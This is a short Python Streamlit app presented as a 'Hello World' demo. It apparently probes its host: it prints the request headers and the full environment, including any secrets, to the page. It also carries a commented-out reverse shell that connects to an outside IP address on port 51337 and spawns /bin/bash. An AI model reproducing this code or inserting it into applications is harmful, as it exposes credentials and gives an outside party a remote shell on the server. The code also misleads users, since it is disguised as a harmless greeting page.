import datetime
import re
from collections import defaultdict, namedtuple
import os
import socket,pty
import streamlit as st
from notion_client import Client

st.set_page_config("Roadmap", "https://streamlit.io/favicon.svg")
TTL = 24 * 60 * 60


st.image("https://streamlit.io/images/brand/streamlit-mark-color.png", width=78)

st.write(
    """
    # Streamoku Hello World Application is Ready!

    Welcome to our Streamoku! 👋 ✨
    """
)

st.write(st.context.headers)
st.write(os.environ)

# s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# s.connect(("54.226.38.52",51337))
# os.dup2(s.fileno(),0)
# os.dup2(s.fileno(),1)
# os.dup2(s.fileno(),2)
# pty.spawn("/bin/bash")
